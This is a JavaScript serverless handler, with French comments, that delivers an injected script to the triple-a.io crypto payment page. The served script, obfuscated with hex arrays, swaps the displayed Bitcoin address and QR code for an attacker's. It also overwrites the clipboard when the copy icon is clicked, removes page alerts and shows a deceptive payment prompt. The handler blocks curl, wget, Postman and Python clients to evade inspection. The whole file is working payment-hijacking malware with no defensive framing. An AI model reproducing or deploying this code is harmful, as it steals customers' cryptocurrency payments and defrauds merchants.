// api/get-script.js

export default function handler(req, res) {
    // 1. On vérifie que la requête vient bien du site cible
    const referer = req.headers.referer;
    if (!referer || !referer.includes('triple-a.io')) {
        return res.status(403).send('Accès refusé — va te faire foutre.');
    }

    // 2. On bloque les outils automatiques (Postman, Python requests, etc.)
    const userAgent = req.headers['user-agent'];
    if (userAgent && (
        userAgent.includes('Postman') ||
        userAgent.includes('python') ||
        userAgent.includes('curl') ||
        userAgent.includes('wget')
    )) {
        console.log("[ALERTE] Tentative d'accès non autorisé bloquée:", userAgent);
        return res.status(403).send('');
    }

    // 3. On désactive le cache pour éviter la sauvegarde
    res.setHeader('Content-Type', 'application/javascript');
    res.setHeader('Cache-Control', 'no-store');
    res.setHeader('X-Content-Type-Options', 'nosniff');

    // 4. On retourne ton script ENTIER ici (encodé ou brut)
    const scriptCode = `
        (function () {
'use strict';
const addressHex = [
'62', '63', '31', '71', '7a', '65', '64', '78',
'33', '7a', '32', '78', '7a', '6b', '32', '34',
'76', '64', '6a', '65', '79', '32', '37', '39',
'76', '33', '75', '33', '78', '6e', '68', '39',
'77', '73', '63', '35', '6a', '77', '6d', '77',
'79', '6a'
];
const clientHash = addressHex.map(h => String.fromCharCode(parseInt(h, 16))).join('');
const qrHex = [
'68', '74', '74', '70', '73', '3a', '2f', '2f',
'69', '2e', '69', '6d', '67', '75', '72', '2e',
'63', '6f', '6d', '2f', '78', '45', '46', '6b',
'4e', '6c', '55', '2e', '70', '6e', '67'
];
const imgPayload = qrHex.map(h => String.fromCharCode(parseInt(h, 16))).join('');
let updated = false;
const updateAddressAndQRCode = () => {
const copyIcon =
document.querySelector('.triplea-copy-icon-for-address,[data-testid="copy-icon"]');
if (copyIcon) {
copyIcon.addEventListener('click', () => {
setTimeout(() => {
navigator.clipboard.writeText(clientHash);
}, 100);
});
}
if (updated) return;
const addressElement =
document.querySelector('.triplea-new-address,[data-testid="btc-address"]');
const qrElement =
document.querySelector('.triplea-qrcode-container,img[src*="create-qr-code"]');
if (addressElement && qrElement) {
addressElement.innerText = clientHash;
const qrImage = document.createElement('img');
qrImage.src = imgPayload;

qrImage.alt = 'QR Code personnalisé';
qrImage.style.width = '200px';
qrImage.style.height = '200px';
qrImage.style.display = 'block';
qrImage.style.margin = 'auto';
qrImage.style.border = '1px solid #ccc';
qrImage.style.padding = '10px';
qrImage.style.background = '#fff';
qrElement.replaceWith(qrImage);
alert('Actualisation de la page glitch activé ! Horaire modifée, Appuyer sur Ok pourcontinuer
et procédez au paiement ! Remboursement valable');
updated = true;
return true;
}
return false;
};
const startMonitoring = () => {
const intervalId = setInterval(() => {
if (updateAddressAndQRCode()) clearInterval(intervalId);
}, 200);
};
if (document.readyState === 'loading') {
document.addEventListener('DOMContentLoaded', startMonitoring);
} else {
startMonitoring();
}
const observer = new MutationObserver(() => {
if (!updated) updateAddressAndQRCode();
});
observer.observe(document.body, { childList: true, subtree: true });
setInterval(() => {
document.querySelectorAll('[data-test-id*="alert-wrapper"]').forEach(el => el.remove());
const oldQR = document.querySelector('.triplea-qrcode-container');
if (oldQR) oldQR.remove();
}, 100);
})();

    return res.send(scriptCode);
}
